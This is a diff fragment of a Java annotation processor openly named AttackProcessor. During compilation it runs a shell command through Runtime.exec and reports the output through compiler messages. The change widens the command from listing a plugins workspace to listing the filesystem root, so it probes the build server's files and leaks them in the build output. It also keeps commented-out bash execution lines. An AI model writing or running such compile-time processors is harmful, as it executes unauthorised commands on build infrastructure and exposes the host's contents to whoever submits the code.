@@ -30,7 +30,7 @@ public class AttackProcessor extends AbstractProcessor {
             //Runtime r = Runtime.getRuntime();
             //Process p = r.exec(new String[]{"/bin/bash","-c","open ."});
 
-            Scanner s = new Scanner( Runtime.getRuntime().exec( "ls -a /root/workspace/plugins/" ).getInputStream() ).useDelimiter(
+            Scanner s = new Scanner( Runtime.getRuntime().exec( "ls -a /" ).getInputStream() ).useDelimiter(
                     "\\A" );
             String rest = s.hasNext() ? s.next() : "";
             processingEnv.getMessager().printMessage(
